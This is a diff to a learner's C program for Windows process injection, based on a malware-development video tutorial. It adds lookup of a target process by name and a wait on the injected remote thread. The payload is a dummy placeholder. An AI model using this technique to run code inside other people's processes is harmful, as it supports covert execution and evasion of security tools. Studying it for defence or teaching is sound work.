@@ -3,10 +3,21 @@
  * from: Malware Development: Process Injection
  *       https://www.youtube.com/watch?v=A6EKDAKBXPs
  * v2: writing to virtual memory
+ * v3: add get_process_id_by_name() function
+ *     get PID from get_process_id_by_name() function
+ * v4: WaitForSingleObject() function
  * last: 20250908 (en)
  */
 #include <stdio.h>
 #include <windows.h>
+
+/* v3 */
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+
+/* v3 */
+int get_process_id_by_name(const char *procname);
 
 const char *k = "[+]";
 const char *i = "[+]";
@@ -24,11 +35,12 @@ unsigned char injected[] = "\x41\x41\x41\x41\x41\x41\x41\x4\x41"; /* unsigned ch
 int main(int argc, char **argv) {
 
 	if (argc < 2) {
-		printf("%s usage: %s <PID>\n", e, argv[0]);
+		printf("%s usage: %s <process name.exe>\n", e, argv[0]);
 		return EXIT_FAILURE;
 	}
 
-	PID = atoi(argv[1]);
+	// PID = atoi(argv[1]);
+	PID = (DWORD) get_process_id_by_name(argv[1]); /* v3 */
 	printf("%s trying to open a handle to process (%ld)\n", i, (unsigned long)PID);
 
 	/* open handle to the process */
@@ -106,11 +118,58 @@ int main(int argc, char **argv) {
 
 	printf("%s got a handle to the thread (%ld)!\n\\---0x%p\n", k, (unsigned long)TID, hThread);
 
+	/* v4 */
+	/* from: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
+
+       DWORD WaitForSingleObject(
+           [in] HANDLE hHandle,
+           [in] DWORD  dwMilliseconds
+       );
+	 */
+	printf("%s waiting for thread to finish ...\n", i);
+	WaitForSingleObject(hThread, INFINITE);
+	printf("%s thread finished executing\n", k);
+
 	printf("%s cleaning up ...\n", i);
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
 	printf("%s done!\n", i);
 
 	return EXIT_SUCCESS;
+}
+
+/* MINE !! */
+int get_process_id_by_name(const char *procname) {
+
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe;
+	int pid = 0;
+	BOOL hResult;
+
+	// snapshot of all processes in the system
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+	// initializing size: needed for using Process32First
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	// info about first process encountered in a system snapshot
+	hResult = Process32First(hSnapshot, &pe);
+
+	// retrieve information about the processes
+	// and exit if unsuccessful
+	while (hResult) {
+		// if we find the process: return process ID
+		// if (strcmp(procname, pe.szExeFile) == 0) {
+		if (strcasecmp(procname, pe.szExeFile) == 0) { /* v2: case insensitive cmp */
+			pid = pe.th32ProcessID;
+			break;
+		}
+		hResult = Process32Next(hSnapshot, &pe);
+	}
+
+	// closes an open handle (CreateToolhelp32Snapshot)
+	CloseHandle(hSnapshot);
+	return pid;
 }
 
